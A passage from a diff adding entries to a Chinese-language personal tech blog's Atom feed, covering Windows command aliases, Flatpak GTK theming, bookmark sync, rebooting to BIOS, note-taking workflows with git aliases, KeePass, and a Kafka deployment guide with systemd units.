+    <published>2024-05-15T10:47:49.000Z</published>
+    <updated>2024-05-15T12:32:01.000Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="在终端中临时设定">在终端中临时设定</h2><h3 id="方法-1-使用-set">方法 1 使用 set</h3><p>如何设定：</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmd"><span class="hljs-built_in">set</span> &quot;ls=busybox.exe ls&quot;<br></code></pre></td></tr></table></figure><p>如何使用：</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmd"><span class="hljs-variable">%ls%</span><br></code></pre></td></tr></table></figure><h3 id="方法-2-使用-doskey">方法 2 使用 doskey</h3><p><em>此方式仅适用于交互式命令行 -它们不适用于批处理脚本，且不能用在管道的任一侧</em></p><p>如何设定：</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmd"><span class="hljs-built_in">doskey</span> ls=busybox.exe ls<br></code></pre></td></tr></table></figure><p>如何使用：</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmd">ls<br></code></pre></td></tr></table></figure><h2 id="持久化设定">持久化设定</h2><p>将 <code>%USERPROFILE%\bin</code> 添加到 <code>PATH</code> 环境变量中。然后将脚本保存在那里。</p><p><code>ls.cmd</code>:</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs cmd">@<span class="hljs-built_in">echo</span> off<br>busybox.exe ls<br></code></pre></td></tr></table></figure><p>然后可以在命令行中输入 <code>ls</code> 。<br />也可以使用 <code>call</code> 函数在脚本内调用它</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">call</span> <span class="hljs-keyword">ls</span><br></code></pre></td></tr></table></figure>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h2 id=&quot;在终端中临时设定&quot;&gt;在终端中临时设定&lt;/h2&gt;
+&lt;h3 id=&quot;方法-1-使用-set&quot;&gt;方法 1 使用 set&lt;/h3&gt;
+&lt;p&gt;如何设定：&lt;/p&gt;
+&lt;figure class=&quot;highlight cmd&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutte</summary>
+      
+    
+    
+    
+    
+    <category term="windows" scheme="https://blog.oopsky.top/tags/windows/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>为 Flatpak 应用程序指定 GTK 主题</title>
+    <link href="https://blog.oopsky.top/post/f4f54c22/"/>
+    <id>https://blog.oopsky.top/post/f4f54c22/</id>
+    <published>2024-05-11T13:48:05.000Z</published>
+    <updated>2024-05-11T13:48:05.000Z</updated>
+    
+    <content type="html"><![CDATA[<p>如果在 Linux 桌面环境设置了暗黑主题，且使用的桌面环境不是 Gnome，Flatpak 内的 GTK 程序的主题都将是亮色的，简直亮瞎眼。可参照下面操作设定Flatpak 程序的 GTK 主题。</p><h2 id="使用-flatpak-安装主题">1. 使用 flatpak 安装主题</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">flatpak install flathub org.gtk.Gtk3theme.Adapta<br></code></pre></td></tr></table></figure><h2 id="设定环境变量">2. 设定环境变量</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> flatpak override --<span class="hljs-built_in">env</span>=GTK_THEME=Adwaita:dark<br></code></pre></td></tr></table></figure><p>然后再启动程序，主题就是暗黑的了。</p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;p&gt;如果在 Linux 桌面环境设置了暗黑主题，且使用的桌面环境不是 Gnome，
+Flatpak 内的 GTK 程序的主题都将是亮色的，简直亮瞎眼。可参照下面操作设定
+Flatpak 程序的 GTK 主题。&lt;/p&gt;
+&lt;h2 id=&quot;使用-flatpak-安装主题&quot;&gt;1. 使用</summary>
+      
+    
+    
+    
+    
+    <category term="linux" scheme="https://blog.oopsky.top/tags/linux/"/>
+    
+    <category term="flatpak" scheme="https://blog.oopsky.top/tags/flatpak/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>跨平台浏览器书签同步方案</title>
+    <link href="https://blog.oopsky.top/post/89ee99f4/"/>
+    <id>https://blog.oopsky.top/post/89ee99f4/</id>
+    <published>2024-04-05T11:23:36.000Z</published>
+    <updated>2024-04-10T01:25:03.000Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="tldr">TL;DR</h2><p>PC端（Chrome/Firefox）使用浏览器插件，移动端（IOS/Android）使用它提供的app，都在这个 <a href="https://floccus.org/download">链接</a> 里。<br />同步方式使用 WebDAV（坚果云注册个账号就行了）</p><h2 id="使用方式">使用方式</h2><h3 id="安装插件">1. 安装插件</h3><ul><li><ahref="https://addons.mozilla.org/zh-CN/firefox/addon/floccus/">Firefox</a></li><li><ahref="https://microsoftedge.microsoft.com/addons/detail/gjkddcofhiifldbllobcamllmanombji">Edge</a></li><li><ahref="https://chromewebstore.google.com/detail/floccus-bookmarks-sync/fnaicdffflnofjppbagibeoednhnbjhg">Chrome</a></li></ul><h3 id="配置同步方式">2. 配置同步方式</h3><p>新建账户选择 WebDAV 然后填入账号密码等信息即可，注意</p><ul><li>“书签路径”为同步文件在 WebDAV 服务器中的路径</li><li>“文件夹映射 - 本地文件夹”为浏览器中要同步的书签的文件夹</li></ul><h3 id="保存然后点击浏览器插件栏内图标以开始第一次同步">3.保存，然后点击浏览器插件栏内图标以开始第一次同步</h3><h2 id="注意">注意</h2><p>这个插件有可能会和浏览器自带账号同步产生冲突，故如果 PC 端使用的是Edge/Chrome/Firefox 等浏览器并登陆了账号的话，</p><ul><li>要么把 floccus设置里的同步策略改为“始终上传本地更改并敏销来自其他浏览器的更改”，移动端APP 上只做浏览用。</li><li>要么关闭浏览器内置的书签同步服务，只使用 floccus 作为同步工具。</li></ul>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h2 id=&quot;tldr&quot;&gt;TL;DR&lt;/h2&gt;
+&lt;p&gt;PC
+端（Chrome/Firefox）使用浏览器插件，移动端（IOS/Android）使用它提供的
+app，都在这个 &lt;a href=&quot;https://floccus.org/download&quot;&gt;链接&lt;/a&gt; 里。&lt;br </summary>
+      
+    
+    
+    
+    
+    <category term="floccus" scheme="https://blog.oopsky.top/tags/floccus/"/>
+    
+    <category term="bookmarks" scheme="https://blog.oopsky.top/tags/bookmarks/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>使用命令重启到BIOS</title>
+    <link href="https://blog.oopsky.top/post/c93c285c/"/>
+    <id>https://blog.oopsky.top/post/c93c285c/</id>
+    <published>2023-10-11T02:18:02.000Z</published>
+    <updated>2024-04-23T04:59:00.000Z</updated>
+    
+    <content type="html"><![CDATA[<p>直接用命令，比百度上搜各品牌的快捷键然后开机时狂按带劲多了😂</p><h2 id="windows">Windows</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment"># 需使用管理员权限打开终端</span><br>shutdown /<span class="hljs-built_in">r</span> /<span class="hljs-built_in">fw</span> /f /t <span class="hljs-number">0</span><br></code></pre></td></tr></table></figure><h2 id="linux">Linux</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 先切到 root 用户</span><br>systemctl reboot --firmware-setup<br></code></pre></td></tr></table></figure>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;p&gt;直接用命令，比百度上搜各品牌的快捷键然后开机时狂按带劲多了😂&lt;/p&gt;
+&lt;h2 id=&quot;windows&quot;&gt;Windows&lt;/h2&gt;
+&lt;figure class=&quot;highlight powershell&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre</summary>
+      
+    
+    
+    
+    
+    <category term="linux" scheme="https://blog.oopsky.top/tags/linux/"/>
+    
+    <category term="windows" scheme="https://blog.oopsky.top/tags/windows/"/>
+    
+    <category term="boot" scheme="https://blog.oopsky.top/tags/boot/"/>
+    
+    <category term="bios" scheme="https://blog.oopsky.top/tags/bios/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>个人笔记管理方案进化历程</title>
+    <link href="https://blog.oopsky.top/post/28d1aacb/"/>
+    <id>https://blog.oopsky.top/post/28d1aacb/</id>
+    <published>2023-09-24T13:31:41.000Z</published>
+    <updated>2024-06-04T16:23:16.000Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="第一阶段typoravs-code-git">第一阶段：Typora/VS Code + Git</h2><p>使用时间：2018 - 2022</p><p>朴实无华的纯 Markdown 文件，只是为这些文件加上了版本控制。</p><p>由于我使用 Git 作为版本管理工具，我可以将这些 Markdown 文件推送到各大Git 托管网站。这样就实现了多端备份，并且在线编辑也还算方便。</p><h2id="第二阶段joplin-s3自建-joplin-server-vs-codemarkdown-插件">第二阶段：Joplin+ S3/自建 Joplin Server + VS Code（Markdown 插件）</h2><p>使用时间：2022 - 2023</p><p>Joplin 支持多种同步方式。不过，由于 Joplin 使用 SQLite数据库文件存储内容，我无法直接访问单个笔记文件了。</p><p>其间发现了一个菊苣做的 <ahref="https://joplin-utils.rxliuli.com/web/joplin-batch-web">网页工具</a>，可以很方便的在Joplin 内进行一些批量操作，她还有一个叫 <ahref="https://github.com/rxliuli/mami">mami</a>的项目，可以批量导出带有某 tag 的笔记为适用于 hexo的格式，很方便，相当长一段时间里我都对这个流程很满意<del>（尽管我也没发几篇博客）</del>，直到我发现手动备份Joplin 笔记库然后导入笔记后，每个文章的 abbrlink都会发生变化，这会导致我用前面提到的方法自动转换的 hexo 博客内的 URL发生变化。询问了开发者后，得到的解答是由于 Joplin设计原因，现阶段无法解决此问题。</p><p>还是上面那个大佬，她还为 Joplin 做了一个 VSCode插件：joplin-vscode-plugin，得益于这个插件，我可以直接使用 VSCode操作我的 Joplin 笔记库，大大提升了我平时编辑 Markdown 文件的体验。</p><p>顺便提一下，虽然 Joplin提供了安卓客户端，但使用体验一般，我尝试了一下后就几乎再没打开过。</p><h2 id="第三阶段obsidian-git-memos">第三阶段：Obsidian + Git +Memos</h2><p>使用时间：2023.9.24 - ∞</p><p>先说一下 Memos 吧，它是一个轻量的<del>仿Flomo</del>自托管笔记服务，我都是把这玩意当朋友圈发😂，经过一段时间的发展，这软件现在有了 Android客户端和<del>浏览器插件（已残废）</del>，也挺方便的。</p><p>言归正传。Obsidian被各大博主着重表扬的双链笔记特性确实很好用，在支持双链的同时对传统的Markdown文件结构也没有太多改变。<del>双链笔记功能其实我用的并不多，主要还是把它当作类似Typora 那样的软件来用。</del>而且这软件的插件是真的丰富，UI设计也挺好看，移动端也很不错。</p><p>Obsidian 可以通过一个名为 Obsidian Git 的插件来在软件内实现基于 Git的多设备同步，<del>移动端也可以哦</del>可惜在移动端有点水土不服，我目前的方案是使用Termux 内的 Git 客户端操作笔记所在 Git 仓库实现同步，写了点 alias来简化这个流程：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash">repo_path=<span class="hljs-variable">$HOME</span>/storage/shared/Obsidian/notes-obsidian<br><br>obgit_cmd=<span class="hljs-string">&quot;git --work-tree=<span class="hljs-variable">$repo_path</span> --git-dir=<span class="hljs-variable">$repo_path</span>/.git&quot;</span><br><br><span class="hljs-built_in">alias</span> obcd=<span class="hljs-string">&quot;cd <span class="hljs-variable">$repo_path</span>&quot;</span><br><br><span class="hljs-built_in">alias</span> obgit=<span class="hljs-variable">$obgit_cmd</span><br><br><span class="hljs-built_in">alias</span> obgit-sync=<span class="hljs-string">&quot;<span class="hljs-variable">$obgit_cmd</span> checkout -- &amp;&amp; <span class="hljs-variable">$obgit_cmd</span> reset --hard &amp;&amp; <span class="hljs-variable">$obgit_cmd</span> pull codeup main:main --rebase&quot;</span><br><br><span class="hljs-built_in">alias</span> obgit-clean=<span class="hljs-string">&quot;<span class="hljs-variable">$obgit_cmd</span> checkout -- &amp;&amp; <span class="hljs-variable">$obgit_cmd</span> reset --hard&quot;</span><br><br><span class="hljs-built_in">alias</span> obgit-commit=<span class="hljs-string">&quot;<span class="hljs-variable">$obgit_cmd</span> commit -a -m &#x27;update&#x27;&quot;</span><br><br><span class="hljs-built_in">alias</span> obgit-push-all=<span class="hljs-string">&quot;<span class="hljs-variable">$obgit_cmd</span> remote | xargs -I _  <span class="hljs-variable">$obgit_cmd</span> push _&quot;</span><br></code></pre></td></tr></table></figure><p>由于 Obsidian 笔记库内的每个笔记都是直接以 Markdown文件的方式存储，处理它并不需要太多编程知识，我写了一点 Shell/Python脚本（这个脚本在我的博客仓库里，大概做的就是把 BLOG 子目录的 md文件复制过去，然后处理一下 frontmatter之类的），也算是实现了自动发布文章到博客。</p><p>与用 Joplin 时基于 tag 标记 BLOG的方式不同，现阶段我用的是基于子目录的方式。切换到此方案后，不再使用Joplin 生成的 abbrlink，转为使用 hexo 插件自动生成，这样就避免了abbrlink 发生变化。</p><p>本质上此方案可以看作第一阶段方案的 Pro Max 版，最大的区别就是 Typora换成了 Obsidian，因此也具备第一阶段方案的优点。Obsidian 真香！</p><p>到了这一步，或许不该称之为“个人笔记”了，“知识库”？</p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h2 id=&quot;第一阶段typoravs-code-git&quot;&gt;第一阶段：Typora/VS Code + Git&lt;/h2&gt;
+&lt;p&gt;使用时间：2018 - 2022&lt;/p&gt;
+&lt;p&gt;朴实无华的纯 Markdown 文件，只是为这些文件加上了版本控制。&lt;/p&gt;
+&lt;p&gt;由于我使用 Git</summary>
+      
+    
+    
+    
+    
+    <category term="joplin" scheme="https://blog.oopsky.top/tags/joplin/"/>
+    
+    <category term="obsidian" scheme="https://blog.oopsky.top/tags/obsidian/"/>
+    
+    <category term="markdown" scheme="https://blog.oopsky.top/tags/markdown/"/>
+    
+    <category term="git" scheme="https://blog.oopsky.top/tags/git/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>使用 KeePass 管理密码</title>
+    <link href="https://blog.oopsky.top/post/ed83a9f6/"/>
+    <id>https://blog.oopsky.top/post/ed83a9f6/</id>
+    <published>2023-09-22T23:04:22.000Z</published>
+    <updated>2025-03-17T21:47:23.000Z</updated>
+    
+    <content type="html"><![CDATA[<p>其实这篇文章我计划了好久了，大概去年的 11月份就在我的笔记库里创建了这个条目，但由于种种原因<del>主要是懒</del>一直处于草稿的状态。刚好前两天有个朋友问我是怎么管理我的密码的，我简单回复他之后，想起了在我笔记库里躺了将近一年的这个草稿。于是计划周末整理整理，发布到博客。下面是正文。</p><p>我就不再赘述这种方案和其他密码管理器的优劣对比了，KeePass不依赖私有的云服务，仅此而已。</p><blockquote><p>2025/3/18 updae:<br />Vaultwarden 真香</p></blockquote><h2 id="什么是-keepass">什么是 KeePass</h2><p>KeePass是一款免费的开源密码管理器，可帮助您以安全的方式管理您的密码。您可以将所有密码存储在一个数据库中，并使用主密钥锁定该数据库。因此，您只需记住一把主密钥即可解锁整个数据库。数据库文件使用目前已知的最好、最安全的加密算法（AES-256、ChaCha20和 Twofish）进行加密。</p><p>下面是 KeePass 打动我的一些特点：</p><ul><li>开源、免费</li><li>因为它是开源的，有很多开发者在各种平台为它开发了客户端</li><li>一个主密码即可解密整个数据库。如果想要更高的安全性也可以结合密钥文件使用。</li><li>密码数据库仅由一个文件组成，可以通过 WebDAV等方式轻松地实现跨设备同步。</li><li>密码列表可以导出为各种格式，如 TXT、HTML、XML 和 CSV。</li></ul><h2 id="客户端推荐">客户端推荐</h2><p>下面列出我正在使用的客户端：</p><h3 id="keepassxc">KeePassXC</h3><p>官网：<a href="https://keepassxc.org">https://keepassxc.org</a></p><p>支持平台：Windows, macOS, and Linux</p><p>优点：功能全面，有浏览器插件</p><p>缺点：访问 WebDAV（但可以使用坚果云客户端弥补这一点）</p><h3 id="authpass">AuthPass</h3><p>官网：<a href="https://authpass.app/">https://authpass.app/</a></p><p>支持平台：Windows, macOS, Linux and Android</p><p>优点：界面简洁美观，支持直接访问 WebDAV、GoogleDrive等平台上存储的密码数据库文件</p><p>缺点：功能略少（但也够用）</p><hr /><p>如果上面没提到你现在使用的平台，可以去 <ahref="https://keepass.info/download.html">官网</a> 搜寻</p><h2 id="如何使用">如何使用？</h2><blockquote><p>以在 Windows 上使用 KeePassXC 为例</p></blockquote><ol type="1"><li>首先，需要有一个 WebDAV 网盘，国内建议使用坚果云。</li><li>在坚果云里创建一个目录，比如 KeePass</li><li>在电脑上安装坚果云的客户端，并把上一步创建的 KeePass目录同步到本地某处。</li><li>新建一个密码数据库，并把它保存到坚果云同步的目录内</li><li>现在可以在其他设备访问你的密码库文件</li></ol>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;p&gt;其实这篇文章我计划了好久了，大概去年的 11
+月份就在我的笔记库里创建了这个条目，但由于种种原因&lt;del&gt;主要是懒&lt;/del&gt;一直处于草稿的状态。刚好前两天有个朋友问我是怎么管理我的密码的，我简单回复他之后，想起了在我笔记库里躺了将近一年的这个草稿。于是计划周末整理整理，发</summary>
+      
+    
+    
+    
+    
+    <category term="keepass" scheme="https://blog.oopsky.top/tags/keepass/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>在 Linux 上部署服务之 Kafka</title>
+    <link href="https://blog.oopsky.top/post/85d5b333/"/>
+    <id>https://blog.oopsky.top/post/85d5b333/</id>
+    <published>2023-09-07T18:32:58.000Z</published>
+    <updated>2023-09-08T08:50:16.000Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="下载解压">1. 下载、解压</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> /opt<br>wget http://mirrors.estointernet.in/apache/kafka/3.2.0/kafka_2.13-3.2.0.tgz<br><span class="hljs-built_in">mkdir</span> kafka<br>tar -zxvf kafka_2.13-3.2.0.tgz --strip-component=1 -C kafka<br><span class="hljs-comment"># 创建用来运行kafka的系统用户</span><br>useradd -r -s /bin/bash -d /opt/kafka/ kafka<br><span class="hljs-built_in">chown</span> -R kafka:kafka /opt/kafka/<br><span class="hljs-comment"># 把 kafka/bin 加入PATH</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;export PATH=$PATH:/opt/kafka/bin&#x27;</span> &gt;&gt; /etc/profile.d/dev_libs.sh<br>. /etc/profile.d/dev_libs.sh<br></code></pre></td></tr></table></figure><h2 id="基本配置">2. 基本配置</h2><p>下面两种方式二选一，无特别要求就选 Kafka WithKRaft，也即是官方推荐的方式<sup id="fnref:1" class="footnote-ref"><a href="#fn:1" rel="footnote"><spanclass="hint--top hint--rounded"aria-label="[https://kafka.apache.org/quickstart](https://kafka.apache.org/quickstart)">[1]</span></a></sup></p><h3 id="kafka-with-kraft">2.1 Kafka With KRaft</h3><blockquote><p>在 Kafka 2.8.0 之后的版本中，已经不再使用 ZooKeeper作为默认的协调器，并且在命令行工具中也不再支持--zookeeper选项，改为使用内置的协调器（称为KRaft）来管理主题、分区和其他元数据。</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 切换到 kafka 用户</span><br>su - kafka<br><br><span class="hljs-comment"># 修改配置中的 log.dirs</span><br><span class="hljs-comment"># vim /opt/kafka/config/kraft/server.properties</span><br><span class="hljs-comment"># log.dirs=/opt/kafka/config/kraft/kraft-combined-logs</span><br><br><span class="hljs-comment"># 生成 UUID</span><br>KAFKA_CLUSTER_ID=`/opt/kafka/bin/kafka-storage.sh random-uuid`<br><br><span class="hljs-comment"># 在启动节点之前需要用格式化一下日志目录</span><br>/opt/kafka/bin/kafka-storage.sh format -t <span class="hljs-variable">$KAFKA_CLUSTER_ID</span> -c /opt/kafka/config/kraft/server.properties<br><br><span class="hljs-comment"># 启动服务测试一下</span><br>/opt/kafka/bin/kafka-server-start.sh /opt/kafka/config/kraft/server.properties<br></code></pre></td></tr></table></figure><p>创建 systemd 服务文件</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-comment"># /lib/systemd/system/kafka_no-zk.service</span><br><span class="hljs-section">[Unit]</span><br><span class="hljs-attr">Description</span>=kafka<br><span class="hljs-attr">After</span>=network.target<br><br><span class="hljs-section">[Service]</span><br><span class="hljs-attr">Type</span>=simple<br><span class="hljs-attr">User</span>=kafka<br><span class="hljs-attr">ExecStart</span>=/opt/kafka/bin/kafka-server-start.sh /opt/kafka/config/kraft/server.properties<br><span class="hljs-attr">ExecStop</span>=/opt/kafka/bin/kafka-server-stop.sh<br><span class="hljs-attr">Restart</span>=<span class="hljs-literal">on</span>-abnormal<br><br><span class="hljs-section">[Install]</span><br><span class="hljs-attr">WantedBy</span>=multi-user.target<br></code></pre></td></tr></table></figure><p>启动</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">systemctl daemon-reload<br>systemctl <span class="hljs-built_in">enable</span> --now kafka_no-zk.service<br>systemctl restart kafka_no-zk.service<br>systemctl status kafka_no-zk.service<br></code></pre></td></tr></table></figure><h3 id="kafka-with-zookeeper">2.2 Kafka With ZooKeeper</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># /opt/kafka/config/zookeeper.properties</span><br>dataDir=/opt/kafka/data/zookeeper <span class="hljs-comment"># 修改存储位置为 /opt/kafka/data/zookeeper</span><br><br><span class="hljs-comment"># /opt/kafka/config/server.properties</span><br>log.dirs=/opt/kafka/data/kafka <span class="hljs-comment"># 修改存储位置为 /opt/kafka/data/kafka</span><br>delete.topic.enable = <span class="hljs-literal">true</span> <span class="hljs-comment"># 添加配置，允许删除主题</span><br><br><span class="hljs-comment"># 再次设定权限</span><br><span class="hljs-built_in">chown</span> -R kafka:kafka /opt/kafka/<br></code></pre></td></tr></table></figure><p>创建 systemd 服务文件</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-comment"># /lib/systemd/system/zookeeper.service</span><br><span class="hljs-section">[Unit]</span><br><span class="hljs-attr">Description</span>=zookeeper<br><span class="hljs-attr">After</span>=network.target<br><br><span class="hljs-section">[Service]</span><br><span class="hljs-attr">Type</span>=simple<br><span class="hljs-attr">User</span>=kafka<br><span class="hljs-attr">ExecStart</span>=/opt/kafka/bin/zookeeper-server-start.sh /opt/kafka/config/zookeeper.properties<br><span class="hljs-attr">ExecStop</span>=/opt/kafka/bin/zookeeper-server-stop.sh<br><span class="hljs-attr">Restart</span>=<span class="hljs-literal">on</span>-abnormal<br><br><span class="hljs-section">[Install]</span><br><span class="hljs-attr">WantedBy</span>=multi-user.target<br></code></pre></td></tr></table></figure><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-comment"># /lib/systemd/system/kafka.service</span><br><span class="hljs-section">[Unit]</span><br><span class="hljs-attr">Requires</span>=zookeeper.service<br><span class="hljs-attr">After</span>=zookeeper.service<br><span class="hljs-attr">Description</span>=kafka<br><span class="hljs-attr">After</span>=network.target<br><br><span class="hljs-section">[Service]</span><br><span class="hljs-attr">Type</span>=simple<br><span class="hljs-attr">User</span>=kafka<br><span class="hljs-attr">ExecStart</span>=/opt/kafka/bin/kafka-server-start.sh /opt/kafka/config/server.properties<br><span class="hljs-attr">ExecStop</span>=/opt/kafka/bin/kafka-server-stop.sh<br><span class="hljs-attr">Restart</span>=<span class="hljs-literal">on</span>-abnormal<br><br><span class="hljs-section">[Install]</span><br><span class="hljs-attr">WantedBy</span>=multi-user.target<br></code></pre></td></tr></table></figure><p>启动</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">systemctl daemon-reload<br><br><span class="hljs-comment"># 先启动zookeeper</span><br>systemctl <span class="hljs-built_in">enable</span> --now zookeeper.service<br><span class="hljs-comment"># 查看状态</span><br>systemctl status zookeeper.service<br><br><span class="hljs-comment"># 然后启动 kafka</span><br>systemctl <span class="hljs-built_in">enable</span> --now kafka.service<br><span class="hljs-comment"># 查看状态</span><br>systemctl status kafka.service<br></code></pre></td></tr></table></figure><h2 id="测试">3. 测试</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 创建一个主题</span><br>kafka-topics.sh --create --bootstrap-server localhost:9092 --topic testTopic<br><span class="hljs-comment"># 显示使用信息</span><br>kafka-topics.sh --describe --bootstrap-server localhost:9092 --topic testTopic<br><span class="hljs-comment"># 将一些事件写入主题（生产者）</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Hello, World&quot;</span> | kafka-console-producer.sh --broker-list localhost:9092 --topic testTopic<br><span class="hljs-built_in">cat</span> /etc/os-release | kafka-console-producer.sh --broker-list localhost:9092 --topic testTopic<br><span class="hljs-comment"># 从主题读取事件（消费者）</span><br>kafka-console-consumer.sh --bootstrap-server localhost:9092 --topic testTopic --from-beginning<br></code></pre></td></tr></table></figure><section class="footnotes"><h2>参考</h2><div class="footnote-list"><ol><li><span id="fn:1" class="footnote-text"><span><ahref="https://kafka.apache.org/quickstart">https://kafka.apache.org/quickstart</a><a href="#fnref:1" rev="footnote" class="footnote-backref">↩︎</a></span></span></li></ol></div></section>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h2 id=&quot;下载解压&quot;&gt;1. 下载、解压&lt;/h2&gt;
+&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;li</summary>
+      
+    
+    
+    
+    
+    <category term="linux" scheme="https://blog.oopsky.top/tags/linux/"/>
+    
+    <category term="kafka" scheme="https://blog.oopsky.top/tags/kafka/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>在 Linux 上安全的新增附加 IP</title>
+    <link href="https://blog.oopsky.top/post/f6fb5806/"/>
+    <id>https://blog.oopsky.top/post/f6fb5806/</id>
+    <published>2023-09-03T21:03:41.000Z</published>
+    <updated>2023-09-03T21:35:39.000Z</updated>
+    
